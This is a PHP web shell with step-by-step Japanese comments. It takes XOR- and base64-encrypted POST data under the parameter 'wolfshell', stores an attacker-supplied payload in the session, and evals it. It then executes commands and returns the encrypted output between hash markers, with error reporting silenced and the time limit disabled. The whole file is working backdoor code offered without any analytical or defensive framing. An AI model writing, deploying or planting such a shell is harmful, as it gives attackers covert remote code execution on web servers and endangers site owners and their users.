<?php
// セッションを開始します
@session_start();
// 実行時間を無制限に設定します
@set_time_limit(0);
// エラー報告を抑制します
@error_reporting(0);
// データを変換する関数
function transform_bytes($byte_array, $key_material){
    // 各バイトをループ処理します
    for($i=0; $i<strlen($byte_array); $i++) {
        // キーを選択します
        $selected_key = $key_material[$i+1&15];
        // XOR演算を適用します
        $byte_array[$i] = $byte_array[$i]^$selected_key;
    }
    // 変換されたデータを返します
    return $byte_array;
}
// 認証用のキー
$access_token = base64_decode('d29sZnNoZWxs');
// セッションストレージの識別子
$payload_id = base64_decode('cGF5bG9hZA==');
// 暗号化キー
$cipher_key = '3c6e0b8a9c15224a';
// POSTリクエストを確認します
if (isset($_POST[$access_token])){
    // 入力データをデコードします
    $received_data = transform_bytes(base64_decode($_POST[$access_token]), $cipher_key);
    // セッションにデータが存在するか確認します
    if (isset($_SESSION[$payload_id])){
        // セッションからペイロードを取得します
        $current_payload = transform_bytes($_SESSION[$payload_id], $cipher_key);
        // 特定の文字列が含まれているか確認します
        if (strpos($current_payload, base64_decode('Z2V0QmFzaWNzSW5mbw==')) === false){
            // 再度変換を適用します
            $current_payload = transform_bytes($current_payload, $cipher_key);
        }
        // ペイロードを実行します
		eval($current_payload);
        // ハッシュの最初の部分を出力します
        echo substr(md5($access_token.$cipher_key), 0, 16);
        // 実行結果をエンコードして出力します
        echo base64_encode(transform_bytes(@run($received_data), $cipher_key));
        // ハッシュの残りの部分を出力します
        echo substr(md5($access_token.$cipher_key), 16);
    } else {
        // 初期化コマンドが含まれているか確認します
        if (strpos($received_data, base64_decode('Z2V0QmFzaWNzSW5mbw==')) !== false){
            // データをセッションに保存します
            $_SESSION[$payload_id] = transform_bytes($received_data, $cipher_key);
        }
    }
}
